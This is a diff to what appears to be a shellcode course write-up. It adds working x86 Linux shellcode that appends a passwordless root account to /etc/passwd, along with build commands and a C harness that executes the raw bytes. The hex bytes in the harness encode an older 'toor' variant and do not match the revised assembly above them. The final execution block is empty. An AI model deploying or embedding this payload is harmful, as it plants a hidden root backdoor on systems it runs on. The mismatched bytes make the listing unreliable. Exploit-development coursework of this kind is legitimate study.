@@ -38,7 +38,7 @@ The shellcode then goes on to replace the `#` symbols in the payload by `\x00`s,
 
 To re-create this shellcode, several tweaks were applied to make the shellcode shorter. In no particular order:
 - `/etc/passwd` is pushed on the stack, which changes the operations needed before the `open()` call
-- `toor::0:0::/root:/bin/sh` is appended, which trims down unnecessary bytes
+- `x::0:0::/:/bin/sh` is appended, which trims down a few bytes
 - payload length is explicitly specified (not calculated at run time)
 - additional steps, associated with the original shellcode, are cut and/or rewritten
 
@@ -49,7 +49,7 @@ The final version looks like this:
 ; SLAE Assignment 6: Append Passwd (morphed)
 ; http://shell-storm.org/shellcode/files/shellcode-561.php
 ; Original Shellcode Length:	107 
-; Morphed Shellcode Length:		82
+; Morphed Shellcode Length:		74
 
 global _start
 section .text
@@ -77,9 +77,9 @@ append:
 	xchg eax, ebx 				; fd 
 	push byte 0x4 				; #define __NR_write 4
 	pop eax 					; ssize_t write(int fd, const void *buf, size_t count);
-	mov ecx, esi 				; *buf -> toor::0:0::/root:/bin/sh
-	push byte 0x19 				; length = 25 bytes
-	pop edx 					; count = 25
+	mov ecx, esi 				; *buf -> x::0:0::/:/bin/sh
+	push byte 0x11 				; length = 17 bytes
+	pop edx 					; count = 17
 	int 0x80 					; write
 
 	push byte 0x1 				; #define __NR_exit 1
@@ -88,7 +88,39 @@ append:
 
 stage:
 	call append
-	usr: db "toor::0:0::/root:/bin/shC"
+	usr: db "x::0:0::/:/bin/sh"
+```
+
+Let's compile, link, and get the opcodes:
+
+```
+nasm -f elf32 -o a6-passwd.o a6-passwd.nasm
+ld -o a6-passwd a6-passwd.o 
+objdump -d ./a6-passwd |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
+```
+
+Set the opcodes for execution:
+
+### passwd.c
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xeb\x32\x5e\x99\x88\x56\x18\x6a\x05\x58\x52\x6a\x64\x66\x68\x73\x77\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\x31\xc9\x41\xb5\x04\xcd\x80\x93\x6a\x04\x58\x89\xf1\x6a\x19\x5a\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xc9\xff\xff\xff\x74\x6f\x6f\x72\x3a\x3a\x30\x3a\x30\x3a\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x43";
+
+int main()
+{
+	printf("Shellcode Length:  %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+	ret();
+}
+```
+
+And finally compile and execute:
+
+```
+
 ```
 
 
